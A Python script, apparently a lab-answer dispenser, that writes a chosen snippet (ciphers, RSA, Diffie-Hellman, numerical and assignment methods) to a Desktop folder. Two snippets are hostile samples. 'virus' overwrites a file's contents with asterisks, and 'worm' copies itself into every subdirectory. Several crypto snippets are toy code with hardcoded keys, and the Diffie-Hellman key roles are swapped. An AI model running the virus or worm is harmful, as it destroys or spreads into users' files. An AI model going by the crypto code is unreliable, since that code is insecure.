import os

def run():
    
    def write_to_file(name, code):
        homedir = os.path.expanduser("~")
        desktop_path = os.path.join(homedir, "Desktop")

        if not os.path.exists(desktop_path):
            desktop_path = os.path.join(homedir, "OneDrive", "Desktop")
            if not os.path.exists(desktop_path):
                raise Exception("Desktop folder not found. Please check your folder structure.")

        ai_folder_path = os.path.join(desktop_path, "New Folder")

        if not os.path.exists(ai_folder_path):
            os.mkdir(ai_folder_path)

        file_name = f"{name}.py"
        file_path = os.path.join(ai_folder_path, file_name)

        with open(file_path, "w") as file:
            file.write(code)

        print(file_path)
        print("=k")
        print("\n" * 15)


    codes = {
        "aes" : """
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# pip uninstall crypto
# pip install pycryptodome

def encrypt(plaintext, key):
  if len(key) not in (16, 24, 32):
    print("Key must be 16/24/32 bytes long")
    exit()

  if type(plaintext) is str: plaintext = plaintext.encode('utf-8')
  plaintext = pad(plaintext, AES.block_size)
  iv = get_random_bytes(AES.block_size)
  cipher = AES.new(key, AES.MODE_CBC, iv) # cbc mode
  ciphertext = cipher.encrypt(plaintext)

  return iv + ciphertext

def decrypt(ciphertext, key):
  if len(key) not in (16, 24, 32):
    print("Key must be 16/24/32 bytes long")
    exit()
  
  iv = ciphertext[ : AES.block_size]
  ciphertext = ciphertext[AES.block_size : ]
  cipher = AES.new(key, AES.MODE_CBC, iv)
  plaintext = cipher.decrypt(ciphertext)
  plaintext = unpad(plaintext, AES.block_size)

  return plaintext.decode('utf-8')

text = input("Enter message: ")
key = b'ABCDEFGHIJKLMNOPQRSTUVWX'

e = encrypt(text, key)
print(f"\nEncrypted message: {e.hex()}")
d = decrypt(e, key)
print(f"Decrypted message: {d}")

# ciphertext = c71d1299fb5595b1ed0489623d6ccc8436fe161322155021b12864a97030e29c
# key = ABCDEFGHIJKLMNOPQRSTUVWX
# plaintext = hello world
""",
        "des" : """
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# pip uninstall crypto
# pip install pycryptodome

def encrypt(plaintext, key):
  if len(key) != 8:
    print("Key must be 8 bytes long")
    exit()

  if type(plaintext) is str: plaintext = plaintext.encode('utf-8')
  plaintext = pad(plaintext, DES.block_size)
  iv = get_random_bytes(DES.block_size)
  cipher = DES.new(key, DES.MODE_CBC, iv) # cbc mode
  ciphertext = cipher.encrypt(plaintext)

  return iv + ciphertext

def decrypt(ciphertext, key):
  if len(key) != 8:
    print("Key must be 8 bytes long")
    exit()
  
  iv = ciphertext[ : DES.block_size]
  ciphertext = ciphertext[DES.block_size : ]
  cipher = DES.new(key, DES.MODE_CBC, iv)
  plaintext = cipher.decrypt(ciphertext)
  plaintext = unpad(plaintext, DES.block_size)

  return plaintext.decode('utf-8')

text = input("Enter message: ")
key = b'ABCDEFGH'

e = encrypt(text, key)
print(f"\nEncrypted message: {e.hex()}")
d = decrypt(e, key)
print(f"Decrypted message: {d}")

# ciphertext = fe7c87c94fd622fa0e39b22264ac8b20a9dbd3fafbabb882
# key = ABCDEFGH
# plaintext = hello world
""",
        "dh": """
def getAlpha(q):
  for a in range(q):
    valid = True
    values = set()

    for i in range(1, q): values.add((a ** i) % q)

    for i in range(1, q):
      if i not in values:
        valid = False
        break
      
    if valid:
      alpha = a
      break
  return alpha

def generatePrivate(public, alpha, q): return (alpha ** public) % q

def generateSharedKey(private, public, q): return (private ** public) % q

def main():
  q = int(input("Enter value of q: "))
  alpha = getAlpha(q)
  aPublic = int(input("Enter public key of A: "))
  bPublic = int(input("Enter public key of B: "))
  if aPublic >= q or bPublic >= q:
    print("Public key too large")
    exit()
  aPrivate = generatePrivate(aPublic, alpha, q)
  bPrivate = generatePrivate(bPublic, alpha, q)
  print(f"\nA: {(aPublic, aPrivate)}")
  print(f"B: {(bPublic, bPrivate)}")

  aKey = generateSharedKey(aPrivate, bPublic, q)
  bKey = generateSharedKey(bPrivate, aPublic, q)
  print(f"\nA Shared Key: {aKey}")
  print(f"B Shared Key: {bKey}")

main()

# q = 353
# public A = 97
# public B = 233

# shared key = 160
""",
        "columnar": """
import math

def display(grid):
  for i in range(len(grid)):
    for j in range(len(grid[0])):
      print(grid[i][j], end=' ')
    print()

def getSequence(key):
  letters = list(key)
  positions = []
  for i in range(len(letters)):
    positions.append((letters[i], i))
  positions = sorted(positions)
  
  sequence = [0 for _ in range(len(key))]
  for i in range(len(positions)):
    letter, original = positions[i]
    sequence[original] = i
  
  column_sequence = []
  for i in range(len(sequence)):
    column_sequence.append((sequence[i], i))
  column_sequence.sort()

  return column_sequence

def encrypt(plaintext, key):
  ciphertext = ''
  sequence = getSequence(key)
  rows = math.ceil(len(plaintext) / len(key))
  cols = len(key)
  matrix = [['_' for _ in range(cols)] for _ in range(rows)]

  ptr = 0
  for row in range(rows):
    for col in range(cols):
      if ptr < len(plaintext):
        matrix[row][col] = plaintext[ptr] if plaintext[ptr] != ' ' else '_'
        ptr += 1
      else: matrix[row][col] = '_'
  
  for _, col in sequence: # _ ka matlab useless (like you)
    for row in range(rows):
      ciphertext += matrix[row][col]

  return ciphertext

def decrypt(ciphertext, key):
  plaintext = ''
  sequence = getSequence(key)
  rows = math.ceil(len(ciphertext) / len(key))
  cols = len(key)
  matrix = [['_' for _ in range(cols)] for _ in range(rows)]

  ptr = 0
  for _, col in sequence: # _ ka matlab useless (like you)
    for row in range(rows):
      if ptr < len(ciphertext):
        matrix[row][col] = ciphertext[ptr]
        ptr += 1
      else: matrix[row][col] = '_'

  for row in range(rows):
    for col in range(cols):
      plaintext += matrix[row][col] if matrix[row][col] != '_' else ' '
  return plaintext

text = input("Enter message: ").upper()
key = input("Enter key: ").upper()
e = encrypt(text, key)
print(f"\nEncrypted message: {e}")
d = decrypt(e, key)
print(f"Decrypted message: {d}")

# text = HELLO WORLD
# key = XNRAD
# ciphertext = LR_OL_EW_LO_H_D
""",
        "caesar": """
def encrypt(plaintext):
  ciphertext = ''
  for char in plaintext.upper():
    if char.isalpha():
      newchar = (ord(char) - ord('A') + 3) % 26
      ciphertext += chr(newchar + ord('A'))
    else: ciphertext += char
  return ciphertext

def decrypt(ciphertext):
  plaintext = ''
  for char in ciphertext.upper():
    if char.isalpha():
      newchar = (26 + ord(char) - ord('A') - 3) % 26
      plaintext += chr(newchar + ord('A'))
    else: plaintext += char
  return plaintext

text = input("Enter message: ")
c = encrypt(text)
d = decrypt(c)
print(f"Ciphertext: {c}")
print(f"Plaintext: {d}")

# plaintext = HELLOWORLD
# ciphertext = KHOORZRUOG
""",
        "monoalphabetic" : """
def encrypt(plaintext, key):
  ciphertext = ''
  for char in plaintext.upper():
    if char.isalpha():
      newchar = (ord(char) - ord('A') + key) % 26
      ciphertext += chr(newchar + ord('A'))
    else: ciphertext += char
  return ciphertext

def decrypt(ciphertext, key):
  plaintext = ''
  for char in ciphertext.upper():
    if char.isalpha():
      newchar = (26 + ord(char) - ord('A') - key) % 26
      plaintext += chr(newchar + ord('A'))
    else: plaintext += char
  return plaintext

text = input("Enter message: ")
key = int(input("Enter key: "))
if 0 >= key or key >= 26:
  print("Invalid key")
  exit()

c = encrypt(text, key)
d = decrypt(c, key)
print(f"Ciphertext: {c}")
print(f"Plaintext: {d}")

# plaintext = HELLOWORLD
# key = 11
# ciphertext = SPWWZHZCWO
""",
        "playfair" : """
def display(grid):
  for i in range(5):
    for j in range(5):
      print(grid[i][j], end=' ')
    print()
  print()

def filter(keyword):
  seen = set()
  key = ''
  for char in keyword:
    if char not in seen: key += char
    seen.add(char)
  return key

def getMatrix(keyword):
  keyword = filter(keyword)
  grid = [['_'] * 5 for _ in range(5)]
  letters = [chr(char) for char in range(65, 91) if chr(char) not in keyword and char != 74] # skip keyword letters and J
  
  ptr = 0
  fillingKey = True
  for row in range(5):
    for col in range(5):
      if fillingKey:
        grid[row][col] = keyword[ptr] if keyword[ptr] != 'J' else 'I'
        ptr += 1
        if ptr >= len(keyword): # finished filling key
          fillingKey = False
          ptr = 0
      else:
        grid[row][col] = letters[ptr]
        ptr += 1

  positions = {} # map for getting character row and column
  for row in range(5):
    for col in range(5):
      positions[grid[row][col]] = (row, col)

  return grid, positions

def getPairsEncrypt(text):
  pairs = []
  text = list(text)
  length = len(text)
  i = 0
  while i < length:
    if i == length - 1: # last letter
      pairs.append(f'{text[i]}X')
      break
    if text[i] == text[i+1]: # same letters
      pairs.append(f'{text[i]}X')
      text.insert(i+1, 'X')
      length += 1
    else: pairs.append(f'{text[i]}{text[i+1]}')
    i += 2
  return pairs

def getPairsDecrypt(ciphertext):
  pairs = []
  ciphertext = list(ciphertext)
  i = 0
  while i < len(ciphertext):
    pairs.append(f'{ciphertext[i]}{ciphertext[i+1]}')
    i += 2
  return pairs


def encrypt(plaintext, key):
  grid, positions = getMatrix(key)
  pairs = getPairsEncrypt(plaintext)

  ciphertext = ""
  for pair in pairs:
    row1, col1 = positions[pair[0]]
    row2, col2 = positions[pair[1]]
    if row1 == row2: ciphertext += grid[row1][(col1 + 1) % 5] + grid[row1][(col2 + 1) % 5] # same row
    elif col1 == col2: ciphertext += grid[(row1 + 1) % 5][col1] + grid[(row2 + 1) % 5][col1] # same col
    else: ciphertext += grid[row2][col1] + grid[row1][col2]
  return ciphertext

def decrypt(ciphertext, key):
  grid, positions = getMatrix(key)
  pairs = getPairsDecrypt(ciphertext)
  plaintext = ""
  for pair in pairs:
    row1, col1 = positions[pair[0]]
    row2, col2 = positions[pair[1]]
    if row1 == row2: plaintext += grid[row1][(col1 + 4) % 5] + grid[row1][(col2 + 4) % 5] # same row
    elif col1 == col2: plaintext += grid[(row1 + 4) % 5][col1] + grid[(row2 + 4) % 5][col1] # same col
    else: plaintext += grid[row2][col1] + grid[row1][col2]
  return plaintext

key = input("Enter keyword: ").upper()
text = input("Enter message: ").upper()
e = encrypt(text, key)
print(f"\nEncrypted message: {e}")
d = decrypt(e, key)
print(f"Decrypted message: {d}")

# key = COMPUTER
# plaintext = COMMUNICATE
# ciphertext = OMRMPCGSTPER
""",
        "railfence": """
def encrypt(plaintext, depth):
  ciphertext = ''
  rows = [[] for _ in range(depth)]
  current = 0
  direction = 'S'
  for char in plaintext: # construct rails by travesing diagonally
    rows[current].append(char)
    current = current + 1 if direction == 'S' else current - 1
    if current == depth-1 or current == 0:
      direction = 'N' if direction == 'S' else 'S'

  for row in rows:
    for char in row:
      ciphertext += char

  return ciphertext

def decrypt(ciphertext, depth):
  plaintext = ''
  rows = [[] for _ in range(depth)]
  current = 0
  direction = 'S'
  for char in ciphertext: # construct empty rails by traversing diagonally
    rows[current].append("*")
    current = current + 1 if direction == 'S' else current - 1
    if current == depth-1 or current == 0:
      direction = 'N' if direction == 'S' else 'S'

  char = 0
  for rail in rows:
    for pos in range(len(rail)):
      rail[pos] = ciphertext[char]
      char += 1
    
  current = 0
  direction = 'S'
  for char in ciphertext:
    plaintext += rows[current][0]
    del rows[current][0]
    current = current + 1 if direction == 'S' else current - 1
    if current == depth-1 or current == 0:
      direction = 'N' if direction == 'S' else 'S'
    
  return plaintext

text = input("Enter message: ").upper()
depth = int(input("Enter depth: "))
e = encrypt(text, depth)
print(f"\nEncrypted message: {e}")
d = decrypt(e, depth)
print(f"Decrypted message: {d}") 

# plaintext = MITHIBAI COLLEGE
# depth = 3
# ciphertext = MI LIHBICLEETAOG
""",
        "rsa": """
def gcd(a, b):
  if a == 0: return b
  return gcd(b % a, a)

def generateKeys(p, q):
  n = p * q
  totient = (p - 1)*(q - 1)
  for i in range(2, totient):
    if gcd(i, totient) == 1:
      public = i
      break
  
  for k in range(10):
    private = (1 + (k * totient))/public
    if private != public and round(private) == private: break

  return (public, round(private))

def encrypt(plaintext, public, n): return (plaintext ** public) % n

def decrypt(ciphertext, private, n): return (ciphertext ** private) % n

def main():
  p = int(input("Enter value of p: "))
  q = int(input("Enter value of q: "))
  n = p * q

  plaintext = int(input("Enter message: "))
  if plaintext >= n:
    print("Message too large")
    exit()

  e, d = generateKeys(p, q)
  encrypted = encrypt(plaintext, e, n)
  decrypted = decrypt(encrypted, d, n)
  print(f"\nPublic Key: {e}")
  print(f"Private Key: {d}")
  print(f"\nEncrypted Message: {encrypted}")
  print(f"Decrypted Message: {decrypted}")

main()

# p = 3
# q = 5
# m = 2
# public = 3
# private = 11
# encrypted = 8
""",
        "vernam_otp": """
def encrypt(plaintext, key):
  ciphertext = ''
  for i in range(len(plaintext)):
    letter1 = ord(plaintext[i]) - ord('A')
    letter2 = ord(key[i]) - ord('A')
    newletter = letter1 + letter2
    if newletter >= 26: newletter -= 26
    ciphertext += chr(newletter + ord('A'))
  return ciphertext

def decrypt(ciphertext, key):
  plaintext = ''
  for i in range(len(ciphertext)):
    letter1 = ord(ciphertext[i]) - ord('A')
    letter2 = ord(key[i]) - ord('A')
    newletter = letter1 - letter2
    if newletter < 0: newletter += 26
    plaintext += chr(newletter + ord('A'))
  return plaintext

text = input("Enter message: ").upper()
key = input("Enter keyword: ").upper()

if len(key) != len(text):
  print("Invalid key")
  exit()

e = encrypt(text, key)
print(f"Encrypted message: {e}")
d = decrypt(e, key)
print(f"Decrypted message: {d}")

# plaintext = HELLO
# key = LEMON
# ciphertext = SIXZB
""",
        "vigenere" : """
def displayMatrix(grid):
  for i in range(26):
    for j in range(26):
      print(grid[i][j], end = ' ')
    print()

def getMatrix():
  letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
  grid = [['_' for _ in range(26)] for _ in range(26)]
  start = 0
  for row in range(26):
    ptr = start
    for col in range(26):
      grid[row][col] = letters[ptr]
      ptr = (ptr + 1) % 26
    start += 1
  return grid

def padKey(text, key):
  newkey = ''
  ptr = 0
  for _ in text:
    newkey += key[ptr]
    ptr = (ptr + 1) % len(key)
  return newkey


def encrypt(plaintext, key, grid):
  key = padKey(plaintext, key)
  ciphertext = ''

  for i in range(len(plaintext)):
    if plaintext[i].isalpha():
      row = ord(key[i]) - ord('A')
      col = ord(plaintext[i]) - ord('A')
      ciphertext += grid[row][col]
    else: ciphertext += plaintext[i]
  return ciphertext

def decrypt(ciphertext, key, grid):
  key = padKey(ciphertext, key)
  plaintext = ''

  for i in range(len(ciphertext)):
    row = ord(key[i]) - ord('A')
    if ciphertext[i].isalpha():
      for j in range(26):
        if grid[row][j] == ciphertext[i]:
          plaintext += chr(j + ord('A'))
          break
    else: plaintext += ciphertext[i]
  return plaintext

text = input("Enter message: ").upper()
key = input("Enter keyword: ").upper()

if len(key) > len(text):
  print("Invalid key")
  exit()

grid = getMatrix()
e = encrypt(text, key, grid)
print(f"\nEncrypted message: {e}")
d = decrypt(e, key, grid)
print(f"Decrypted message: {d}")

# plaintext = HELLOWORLD
# key = KEY
# ciphertext = RIJVSUYVJN
""",
        "virus": """
# Write a viruswhich accepts a file name and changes every character to an asterisk
# zzzzz (too easy)

def virus(filename):
  try:
    with open(filename, 'r') as file: data = file.read()
    newdata = '*' * len(data)
    with open(filename, 'w') as file: file.write(newdata)
    print("Virus executed")
  except: print("Error")

filename = input("Enter filename (with extension): ")
virus(filename)
""",
        "bisection" : """
import math
DEGREE = 5

def display(coeffs):
  print('f(x) = ', end='')
  for i in range(DEGREE, -1, -1):
    current = coeffs[DEGREE-i]
    if math.trunc(current) == int(current): current = int(current)
    if current > 0: sign = '+' if i != DEGREE else ''  # ignore plus for first element
    if current < 0: sign = '-'
    if current != 0:
      current = '' if abs(current) == 1 and i != 0 else abs(current)
      if i == 0: print(f'{sign} {current}')  # ignore x^0 for last coefficient
      else: print(f'{sign} {current}x^{i}', end=' ')

def f(x):
  result = 0
  for i in range(DEGREE + 1):
    result = result + (coeffs[i] * (x ** (DEGREE - i)))
  return result

def getInterval(initial=1):
  last = -1 if f(initial-1) < 0 else 1
  for i in range(initial, initial+100):
    if last == -1 and f(i) > 0: return i-1, i, '-+'
    if last == 1 and f(i) < 0: return i-1, i, '+-'
    last = -1 if f(i) < 0 else 1
  print("No opposite signs")
  exit()

def bisection():
  lower, upper, signs = getInterval()
  while True:
    xi = (lower + upper) / 2
    answer = f(xi)
    if round(answer, 5) == 0.0000:
      return xi
    if signs == '-+':
      if f(xi) < 0: lower = xi
      else: upper = xi
    else:
      if f(xi) > 0: lower = xi
      else: upper = xi

coeffs = []
for power in range(DEGREE, -1, -1):
  coeffs.append(float(input(f"Enter coefficient of x^{power}: ")))
display(coeffs)
root = bisection()
if root: print(f'Root: {root}')
else: print('No root')

# Example input:
# Enter coefficient of x^5: 1
# Enter coefficient of x^4: 0
# Enter coefficient of x^3: 0
# Enter coefficient of x^2: -5
# Enter coefficient of x^1: 0
# Enter coefficient of x^0: -4
#
# The input corresponds to the polynomial:
# f(x) = x^5 - 5x^2 - 4
# The bisection method will find a root of this polynomial.
""",
        "simplex": """
def display(equations, delta):
    print(end='')
    for i in range(m + n):
        print(equations[0][i], end='')
    print()
    print('Cb', end='')
    print('Xb', end='')
    for i in range(m): 
        print(f'x{i+1}', end='')
    for i in range(n): 
        print(f'S{i+1}', end='')
    print()
    for i in range(len(equations)):
        if i == 0: continue  # Skip objective row
        for coeff in equations[i]:
            print(coeff, end='')
        print()
    print(end='')
    print()
    for i in range(len(delta)):
        print(delta[i], end='')
def getCoefficients(equation, eqno):
    coefficients = []
    if eqno != '': 
        coefficients.append(0.0)  # No Cb for objective row
    i = 0
    while i < len(equation):
        if equation[i] == '+' or equation[i] == '<=' or equation[i] == '-':
            pass  # Skip these symbols
        elif 'x' in equation[i]:
            # Extract coefficient for x variables
            digit = equation[i][:equation[i].index('x')]
            if (i > 0 and equation[i-1] == '-') or equation[i][0] == '-':
                factor = -1.0
            else:
                factor = 1.0
            coeff = factor if digit == '' or digit == '-' else factor * float(digit)
            coefficients.append(coeff)
        elif equation[i].isdigit():  # Handle RHS value
            coeff = float(equation[i])
            if eqno != '':  
                coefficients.insert(1, coeff)
        i += 1
    if eqno != '':  # Add slack variables for constraints
        for j in range(n):
            identity = 0.0
            if j == eqno:
                identity = 1.0  # Slack variable
            coefficients.append(identity)
    else:
        for _ in range(n):
            coefficients.append(0.0)  # Zero slack for objective function
    return coefficients
def solve(equations):
    delta = [0] * (m + n)  # Initialize delta with zeros
    for col in range(m + n):  # Loop through all columns
        deltaj = 0
        for row in range(1, n + 1):  # Skip objective row
            deltaj += equations[row][0] * equations[row][col + 1]
        delta[col] = deltaj - equations[0][col]
    return delta
equations = []
m = int(input("Enter no. of variables: "))
n = int(input("Enter no. of constraints: "))
z = input("Enter z: ")
equations.append(getCoefficients(z.split(), ''))
for i in range(n):
    eq = input(f"Enter constraint {i+1}: ")
    equations.append(getCoefficients(eq.split(), i))
delta = solve(equations)
display(equations, delta)
# Example input:
# Enter no. of variables: 2
# Enter no. of constraints: 2
# Enter z: -3x1 - 5x2
# Enter constraint 1: 1x1 + 1x2 <= 4
# Enter constraint 2: 2x1 + 3x2 <= 6
""",
        "worm" : """
import os
import shutil

def worm(current_file, directory):
  try:
    for parent, directories, files in os.walk(directory):
      destination = os.path.join(parent, os.path.basename(current_file))
      shutil.copy(current_file, destination)
      print(f"Worm replicated to: {destination}")
  except: print("Error")

def main():
  current_file = os.path.basename(__file__)
  directories = [
    "C:\\Users\\sample\\Desktop", 
  ]
  for directory in directories:
    if os.path.isdir(directory):
      worm(current_file, directory)

if __name__ == "__main__": main()
""",
        "assignment" : """
def reduce_rows(matrix):
    # Subtract the minimum value of each row from all elements of that row
    for i in range(len(matrix)):
        min_value = min(matrix[i])
        matrix[i] = [x - min_value for x in matrix[i]]
    return matrix

def reduce_columns(matrix):
    # Subtract the minimum value of each column from all elements of that column
    num_columns = len(matrix[0])
    for j in range(num_columns):
        # Find the minimum value in the column
        min_value = min(matrix[i][j] for i in range(len(matrix)))
        # Subtract the minimum value from each element in the column
        for i in range(len(matrix)):
            matrix[i][j] -= min_value
    return matrix

# Define a 5x5 cost matrix
cost_matrix = [
    [9, 2, 7, 8, 5],
    [6, 4, 3, 7, 3],
    [5, 8, 1, 8, 4],
    [7, 6, 9, 5, 6],
    [6, 3, 4, 5, 9]
]

print("Original cost matrix:")
for row in cost_matrix:
    print(row)

# Step 1: Subtract the smallest element of each row
reduced_matrix = reduce_rows([row[:] for row in cost_matrix])
print("\nMatrix after row reduction:")
for row in reduced_matrix:
    print(row)

# Step 2: Subtract the smallest element of each column
reduced_matrix = reduce_columns(reduced_matrix)
print("\nMatrix after column reduction:")
for row in reduced_matrix:
    print(row)
""",
        "hungarian" : """
def display(matrix):
  for row in range(len(matrix)):
    for col in range(len(matrix[0])):
      print(matrix[row][col], end='\t')
    print()
  print()

def addColumn(matrix):
  n = len(matrix) - len(matrix[0])
  while n > 0:
    for row in matrix:
      row.append(0)
    n -= 1

def addRow(matrix):
  n = len(matrix[0]) - len(matrix)
  while n > 0:
    matrix.append([0] * len(matrix[0]))
    n -= 1

def rowSubtract(matrix):
  for row in range(len(matrix)):
    minimum = float('inf')
    for col in range(len(matrix[0])):
      minimum = min(minimum, matrix[row][col])
    for col in range(len(matrix[0])):
      matrix[row][col] -= minimum

def colSubtract(matrix):
  for col in range(len(matrix[0])):
    minimum = float('inf')
    for row in range(len(matrix)):
      minimum = min(minimum, matrix[row][col])
    for row in range(len(matrix)):
      matrix[row][col] -= minimum

def assign(matrix):
  rows, cols = len(matrix), len(matrix[0])

  for step in range(1, 3):
    # row-wise assignment
    for row in range(rows):
      rowzeroes = 0
      zerocol = -1
      for col in range(cols): # count number of zeroes in row
        if matrix[row][col] == 0:
          rowzeroes += 1
          zerocol = col
      if rowzeroes == 1 or (rowzeroes > 1 and step == 2):  # if multiple zeroes, try randomly
        matrix[row][zerocol] = '[0]'
        for nrow in range(rows):
          if matrix[nrow][zerocol] == 0: matrix[nrow][zerocol] = 'X'
    
    # col-wise assignment
    for col in range(cols):
      colzeroes = 0
      zerorow = -1
      for row in range(rows):
        if matrix[row][col] == 0:
          colzeroes += 1
          zerorow = row
      if colzeroes == 1 or (colzeroes > 1 and step == 2):  # if multiple zeroes, try randomly
        matrix[zerorow][col] = '[0]'
        for ncol in range(cols):
          if matrix[zerorow][ncol] == 0: matrix[zerorow][ncol] = 'X'

def hungarian(matrix):
  rows, cols = len(matrix), len(matrix[0])
  markedRows = set()
  markedCols = set()

  # mark unassigned row
  for row in range(rows):
    if '[0]' not in matrix[row]: markedRows.add(row)
  
  # mark assigned row's crossed columns
  for row in markedRows:
    for col in range(cols):
      if matrix[row][col] == 'X': markedCols.add(col)

  # mark crossed column's assigned rows
  for col in markedCols:
    for row in range(rows):
      if matrix[row][col] == '[0]': markedRows.add(row)
  
  # find minimum uncovered element
  minimum = float('inf')
  for row in range(rows):
    for col in range(cols):
      if matrix[row][col] == '[0]' or matrix[row][col] == 'X': matrix[row][col] = 0 # reset all assignments
      if row in markedRows and col not in markedRows:
        minimum = min(minimum, matrix[row][col])
  
  # subtract and add minimum to elements
  for row in range(rows):
    for col in range(cols):
      if row in markedRows and col not in markedCols:
        matrix[row][col] -= minimum
      if row not in markedRows and col in markedCols:
        matrix[row][col] += minimum

def valid(matrix):
  assigned = 0
  for row in matrix:
    if '[0]' in row:  assigned += 1
  return assigned == len(matrix)

def solve(matrix):
  if len(matrix) > len(matrix[0]): addColumn(matrix)
  if len(matrix) < len(matrix[0]): addRow(matrix)
  rowSubtract(matrix)
  colSubtract(matrix)
  assign(matrix)
  display(matrix)

  if not valid(matrix):
    print("\nApplying Hungarian Method\n")
    hungarian(matrix)
    assign(matrix)
    display(matrix)

matrix = [
  [80, 140, 80, 100, 56, 98],
  [48, 64, 94, 126, 170, 100],
  [56, 80, 120, 100, 70, 64],
  [99, 100, 100, 104, 80, 90],
  [64, 80, 90, 60, 60, 76],
]

# matrix = [
#   [10, 7, 8],
#   [8, 9, 7],
#   [7, 12, 6],
#   [10, 10, 8]
# ]

solve(matrix)
"""
    }

    input_q = input("=>")
    input_q = input_q.strip()
    specific_code = codes[input_q]
    write_to_file(input_q,specific_code)
    
    